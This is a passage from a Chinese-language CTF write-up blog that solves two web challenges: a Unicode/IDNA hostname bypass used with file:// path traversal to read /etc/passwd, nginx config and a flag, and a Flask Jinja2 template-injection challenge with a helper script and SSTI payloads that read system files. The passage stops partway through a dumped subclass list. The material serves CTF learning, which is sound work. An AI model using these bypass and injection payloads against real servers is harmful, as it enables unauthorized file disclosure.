&#x27;xxx.com&#x27;, &#x27;/path/&#x27;]</span></span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># &#x27;xxx.com&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        <span class="comment"># 将字符串idna编码后进行utf8编码，加入列表</span></span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="comment"># [&#x27;xxx&#x27;,&#x27;com&#x27;]</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment"># xxx.com</span></span><br><span class="line">    </span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># http://xxx.com/path/</span></span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="comment"># xxx.com</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">        <span class="comment"># 读取指定内容</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>

<p>根据上面进行分析，原理大概可以说是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#三个判断式：host == &#x27;suctf.cc&#x27; </span></span><br><span class="line"><span class="comment"># 我们需要的是在不满足前面两个判断式的前提下</span></span><br><span class="line"><span class="comment"># 满足第三个判断式</span></span><br><span class="line">url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">        | |-- parse.urlparse(url).hostname =&gt; 第一层 </span><br><span class="line">        |-- <span class="built_in">list</span>(urlsplit(url)) --- [<span class="number">1</span>]=得到域名 =&gt; 第二层</span><br><span class="line">                |--- 域名编码重写 =&gt; 再次核对域名 =&gt; 第三层</span><br><span class="line">                        |---&gt; 读取文件</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个是简单的取出+鉴定</span></span><br><span class="line"><span class="comment"># 第二个是取出域名分割取出域名+鉴定</span></span><br><span class="line"><span class="comment"># 第三个是取出域名，进行idna编码后再合并为URL进行访问</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.尝试空格过滤行不通，服务器报错</span></span><br><span class="line"><span class="comment"># 2.不照着官方提供的suctf.cc写域名会导致通过1和2后，无法通过3</span></span><br><span class="line"><span class="comment"># 这么一看，貌似走入了死胡同。</span></span><br></pre></td></tr></table></figure>

<p>网络上找到的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html">idna这个编码的介绍</a>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">原理</span><br><span class="line">什么是IDN?</span><br><span class="line">国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以ASCII字符串存储。</span><br><span class="line"></span><br><span class="line">什么是idna?</span><br><span class="line">A library to support the Internationalised Domain Names <span class="keyword">in</span> Applications (IDNA) protocol <span class="keyword">as</span> specified <span class="keyword">in</span> RFC <span class="number">5891.</span> This version of the protocol <span class="keyword">is</span> often referred to <span class="keyword">as</span> “IDNA2008” <span class="keyword">and</span> can produce different results <span class="keyword">from</span> the earlier standard <span class="keyword">from</span> <span class="number">2003.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> idna</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(idna.encode(<span class="string">u&#x27;ドメイン.テスト&#x27;</span>))</span><br><span class="line">结果:xn--eckwd4c7c.xn--zckzah</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> idna.decode(<span class="string">&#x27;xn--eckwd4c7c.xn--zckzah&#x27;</span>)</span><br><span class="line">结果:ドメイン.テスト</span><br><span class="line"></span><br><span class="line">Demo:</span><br><span class="line">℆这个字符,如果使用python3进行idna编码的话</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;℆&#x27;</span>.encode(<span class="string">&#x27;idna&#x27;</span>))</span><br><span class="line">结果</span><br><span class="line"><span class="string">b&#x27;c/u&#x27;</span></span><br><span class="line">如果再使用utf-<span class="number">8</span>进行解码的话</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;c/u&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">结果</span><br><span class="line">c/u</span><br><span class="line">通过这种方法可以绕过网站的一些过滤字符</span><br></pre></td></tr></table></figure>

<p>从表面观察看，是将某些字符编码转字符。具体怎么解决呢？</p>
<p>其实这里思路已经很明显了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 上面的python函数实现是这样子的：</span></span><br><span class="line">h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 如果字符串h编码后返回我们期待的字符串呢？</span></span><br><span class="line">&gt;&gt; <span class="string">&#x27;ⓒ&#x27;</span>.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;c&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这就是攻击点。第一次接触，经验不足，知道坑在哪也不知道怎么解决。</p>
<p>既然思路有了，怎么写爆破脚本呢？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">写脚本的思路大概是这样子的：</span><br><span class="line">1.源码仅URL传入，无其它传入，考虑直接利用这个函数</span><br><span class="line">2.三个 == 的绕过，使用idna绕过第一层和第二层的纯域名核对，idna编码还原绕过第三层。</span><br><span class="line">3.符合第2点的部分输出True，并输出字符串</span><br></pre></td></tr></table></figure>

<p>源码改装也就是该几个输出和传入而已。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#写脚本前的补充说明：</span></span><br><span class="line"><span class="built_in">chr</span>() <span class="comment">#用于将 Unicode 码点转换为对应的字符</span></span><br><span class="line">	  <span class="comment"># python中，chr处理的数字范围是1114111。</span></span><br><span class="line">      <span class="comment"># 前 65536 个码点被称为基本多文种平面（Basic Multilingual Plane，简称 BMP），它们用于表示绝大部分常用字符和符号，包括 ASCII 字符集中的所有字符。</span></span><br><span class="line">      <span class="comment"># 这是使用65536攻击的原因</span></span><br></pre></td></tr></table></figure>

<p>爆破脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunsplit, urlsplit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>(<span class="params">url</span>):</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    c = <span class="built_in">chr</span>(x)</span><br><span class="line">    <span class="comment"># 测试每数字所转字符串是否符合源码的条件</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 条件吻合再输出</span></span><br><span class="line">        <span class="keyword">if</span> getUrl(<span class="string">&quot;file://suctf.c&#123;&#125;/&quot;</span>.<span class="built_in">format</span>(c)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;str: &quot;</span> + c + <span class="string">&quot; unicode: \\u&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(x))[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>攻击的脚本最好放在cmd跑，放在Pycharm跑，能出的字符绝对比cmd少一半。</p>
<p>下面这个是cmd的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file://suctf.cℂ</span><br><span class="line">str: ℂ unicode: \u2102</span><br><span class="line">file://suctf.cℭ</span><br><span class="line">str: ℭ unicode: \u212d</span><br><span class="line">file://suctf.cⅭ</span><br><span class="line">str: Ⅽ unicode: \u216d</span><br><span class="line">file://suctf.cⅽ</span><br><span class="line">str: ⅽ unicode: \u217d</span><br><span class="line">file://suctf.cⒸ</span><br><span class="line">str: Ⓒ unicode: \u24b8</span><br><span class="line">file://suctf.cⓒ</span><br><span class="line">str: ⓒ unicode: \u24d2</span><br><span class="line">file://suctf.cＣ</span><br><span class="line">str: Ｃ unicode: \uff23</span><br><span class="line">file://suctf.cｃ</span><br><span class="line">str: ｃ unicode: \uff43</span><br></pre></td></tr></table></figure>

<p>接下来构造下访问的那个url：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">url=file://suctf.cⓒ</span><br></pre></td></tr></table></figure>

<p>寻常直接访问是没什么问题的，可以尝试url再访问，这是一种方法。</p>
<p>或者可以选择直接在URL框输入你的字符串，有一定的成功概率。</p>
<blockquote>
<p>也不知道出了上什么原因，转url格式放bp和直接放url总是失败，不编译放url框反倒没问题，具体原因不晓得。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=<span class="string">&#x27;file://suctf.cⓒ&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(url);</span><br></pre></td></tr></table></figure>

<p>访问时返回这个就证明你绕过那三层代码了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Internal Server Error</span><br><span class="line"></span><br><span class="line">The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error <span class="keyword">in</span> the application.</span><br></pre></td></tr></table></figure>

<p>这个时候需要的是再注意下绕过后代码的功能点是什么：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> urllib.request.urlopen(finalUrl).read()</span><br><span class="line"><span class="comment"># 仔细一看，这个是读取url对象的内容。</span></span><br><span class="line"><span class="comment"># 结合上面提到的nginx配置那个部分，尝试访问下服务器内的文件</span></span><br><span class="line"><span class="comment"># 读取https是肯定不现实的，尝试使用file读取内部文件</span></span><br></pre></td></tr></table></figure>

<p>为了方便测试，稍微改下脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;../../../../..//etc/passwd&#x27;</span>; <span class="comment"># 这个地方就是我们要注入的内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>((<span class="string">&#x27;file://suctf.cⓒ/&#x27;</span>.<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>下面是测试环节：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get:?url=file:<span class="comment">//suctf.cⓒ/../../../../..//etc/passwd</span></span><br><span class="line"><span class="keyword">return</span>:</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:/bin:/bin/sync</span><br><span class="line">games:x:<span class="number">5</span>:<span class="number">60</span>:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:<span class="number">6</span>:<span class="number">12</span>:man:/<span class="keyword">var</span>/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:<span class="number">7</span>:<span class="number">7</span>:lp:/<span class="keyword">var</span>/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:<span class="number">8</span>:<span class="number">8</span>:mail:/<span class="keyword">var</span>/mail:/usr/sbin/nologin</span><br><span class="line">news:x:<span class="number">9</span>:<span class="number">9</span>:news:/<span class="keyword">var</span>/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:<span class="number">10</span>:<span class="number">10</span>:uucp:/<span class="keyword">var</span>/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:<span class="number">13</span>:<span class="number">13</span>:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:<span class="number">33</span>:<span class="number">33</span>:www-data:/<span class="keyword">var</span>/www:/usr/sbin/nologin</span><br><span class="line">backup:x:<span class="number">34</span>:<span class="number">34</span>:backup:/<span class="keyword">var</span>/backups:/usr/sbin/nologin</span><br><span class="line"><span class="keyword">list</span>:x:<span class="number">38</span>:<span class="number">38</span>:Mailing List Manager:/<span class="keyword">var</span>/<span class="keyword">list</span>:/usr/sbin/nologin</span><br><span class="line">irc:x:<span class="number">39</span>:<span class="number">39</span>:ircd:/<span class="keyword">var</span>/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:<span class="number">41</span>:<span class="number">41</span>:Gnats Bug-Reporting <span class="title function_ invoke__">System</span> (admin):/<span class="keyword">var</span>/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:<span class="number">100</span>:<span class="number">65534</span>::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">nginx:x:<span class="number">101</span>:<span class="number">102</span>:nginx user,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 成功访问到密码文件后，尝试访问nginx配置文件</span></span><br><span class="line"><span class="comment"># 上面访问的末尾提示的信息是：nginx在user,usr貌似是这个的另外一种写法？</span></span><br><span class="line"><span class="comment"># 遗憾的是并不是直接放在etc文件夹当中的</span></span><br><span class="line"><span class="comment"># 这里为什么使用/usr/local/这个路径，个人猜测应该是linux的常规配置吧</span></span><br><span class="line"><span class="comment"># 如果有大佬知道为什么还请告知</span></span><br><span class="line">get:?url=file:<span class="comment">//suctf.cℂ/../../../../../../usr/local/nginx/conf/nginx.conf</span></span><br><span class="line"><span class="keyword">return</span>:</span><br><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files <span class="variable">$uri</span> @app;</span><br><span class="line">    &#125;</span><br><span class="line">    location @app &#123;</span><br><span class="line">        <span class="keyword">include</span> uwsgi_params;</span><br><span class="line">        uwsgi_pass unix:<span class="comment">///tmp/uwsgi.sock;</span></span><br><span class="line">    &#125;</span><br><span class="line">    location /<span class="built_in">static</span> &#123;</span><br><span class="line">        alias /app/<span class="built_in">static</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># location /flag &#123;</span></span><br><span class="line">    <span class="comment">#     alias /usr/fffffflag;</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在知道flag的位置后，直接访问flag</span></span><br><span class="line">get:?url=file:<span class="comment">//suctf.cℂ/usr/fffffflag</span></span><br><span class="line"><span class="keyword">return</span>: flag&#123;b12eb42f-<span class="number">241</span>a-<span class="number">4</span>ffd-<span class="number">9940</span>-<span class="number">94100027</span>acba&#125;</span><br></pre></td></tr></table></figure>

<h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><h2 id="原始信息-28"><a href="#原始信息-28" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">两个框框，一个输入的是加密为<span class="built_in">base64</span>字符串，一个输入解密<span class="built_in">base64</span>字符串，一个提示为pin</span><br><span class="line">题目提示信息为flask app，说明与flask框架相关。</span><br></pre></td></tr></table></figure>

<h2 id="解题-28"><a href="#解题-28" class="headerlink" title="解题"></a>解题</h2><p>解题记住一点，有输入输出，就一定要尝试任何方法进行输入注入和回显（血的教训，大佬终究是太高明了……）</p>
<p>为了方便解题，这里先写一个脚本进行协助。具体原理：</p>
<blockquote>
<p>原则上来说，将每个表单发送的和接收的方式记住了，就能模拟浏览器访问，省去我们繁琐的解题步骤。看了很多篇大佬写的文章，或许对他们了解的人来说这不是什么痛点，但对小白来说是挺痛的……</p>
<p>下面的脚本主要是模拟了数据的收发，只需要输入想要注入的数据，脚本会自动省去手动使用解密页面的解密框框直接解密，以及将双层html实体解密为单层。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> request,html</span><br><span class="line"></span><br><span class="line"><span class="comment">## 两种正则表达式获取对应的值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reqs</span>(<span class="params">url,token1,cmd</span>):</span><br><span class="line">    header = &#123; <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&quot;</span> &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;csrf_token&#x27;</span> : token1,</span><br><span class="line">        <span class="string">&#x27;text&#x27;</span> : cmd,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span> : <span class="string">&#x27;提交&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    reqs = requests.post(url, headers=header,data=data)</span><br><span class="line">    res = <span class="string">r&#x27;结果\s*:\s*([a-zA-Z0-9+/=]+)&#x27;</span></span><br><span class="line">    </span><br><span class="line">    strs = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> re.finditer(res,reqs.text):</span><br><span class="line">        strs+=result.group()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> strs.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repo</span>(<span class="params">url,token2,cmds</span>):</span><br><span class="line">    header = &#123; <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;csrf_token&#x27;</span> : token2,</span><br><span class="line">        <span class="string">&#x27;text&#x27;</span> : cmds,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span> : <span class="string">&#x27;提交&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取返回的post数据</span></span><br><span class="line">    reqs = requests.post(url, headers=header,data=data)</span><br><span class="line">    <span class="comment"># 临时写入文件当中，确保数据的准确性不会受到编码等因素的干扰</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xxx.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(reqs.text)</span><br><span class="line">        file.close()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xxx.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lists = file.readlines()</span><br><span class="line"></span><br><span class="line">    all_list = []</span><br><span class="line">    code =<span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> lists:</span><br><span class="line">        <span class="keyword">if</span> value == <span class="string">&#x27;\t&lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot;&gt;&amp;times;&lt;/button&gt;\n&#x27;</span>:</span><br><span class="line">            code = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> code:</span><br><span class="line">            <span class="keyword">if</span> value==<span class="string">&quot;&lt;/div&gt;\n&quot;</span>:</span><br><span class="line">                code = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            all_list.append(value)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        all_list[<span class="number">0</span>] = all_list[<span class="number">0</span>].split(<span class="string">&#x27;：&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> all_list:</span><br><span class="line">            <span class="built_in">print</span>([html.unescape(html.unescape(value))])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment"># 出现异常情况的时候打印值查看原因</span></span><br><span class="line">        <span class="built_in">print</span>(all_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_html</span>(<span class="params">cmdsf,url</span>):</span><br><span class="line">    token1 = <span class="string">&#x27;ImVkOGEwMmNmOGJhYTA0MDJmY2M1ZGFhNmIyYTI2MjU5YjA0MzE5NjEi.ZQ0CAw.ij40xETpVLk-PRPjS9-0B6WcS7E&#x27;</span></span><br><span class="line">    cmd = cmdsf</span><br><span class="line">    <span class="comment"># 调用获取加密函数</span></span><br><span class="line">    cmds = reqs(url, token1, cmd)</span><br><span class="line">    url = url + <span class="string">&#x27;decode&#x27;</span></span><br><span class="line">    token2 = <span class="string">&#x27;ImVkOGEwMmNmOGJhYTA0MDJmY2M1ZGFhNmIyYTI2MjU5YjA0MzE5NjEi.ZQ0CEw.34tOrFrNBRRXBPC_DtLibdVyqN8&#x27;</span></span><br><span class="line">    <span class="comment"># 调用获取解密值</span></span><br><span class="line">    repo(url, token2, cmds)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://52243be5-e05e-48ef-afe4-96b8afa41c96.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">    cmd = <span class="built_in">input</span>(<span class="string">&quot;请输入注入语句：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;返回的结果为：&#x27;</span>)</span><br><span class="line">    cmd_html(cmd,url)</span><br></pre></td></tr></table></figure>

<p>上面的token1和token2一般是不用改的，如果题目有变动改下即可。cmd是我们手动输入的命令，或者注入模板。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">或者这个也行：</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>上面是大佬的两个注入模板，这里就一步步拆解下：</p>
<blockquote>
<p>下面全属于使用脚本测试的内容</p>
</blockquote>
<p>获取基类：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">请输入注入语句：&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">返回的结果为：</span><br><span class="line">[<span class="string">&quot; &lt;class &#x27;tuple&#x27;&gt;\n&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>获取基类元组：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入注入语句：&#123;&#123;().__class__.__bases__&#125;&#125;</span><br><span class="line">返回的结果为：</span><br><span class="line">[&quot; (&lt;class &#x27;object&#x27;&gt;,)\n&quot;]</span><br></pre></td></tr></table></figure>

<p>获取当前类所有子类的列表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">请输入注入语句：&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()&#125;&#125;</span><br><span class="line">返回的结果为：</span><br><span class="line">[<span class="string">&quot; [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class 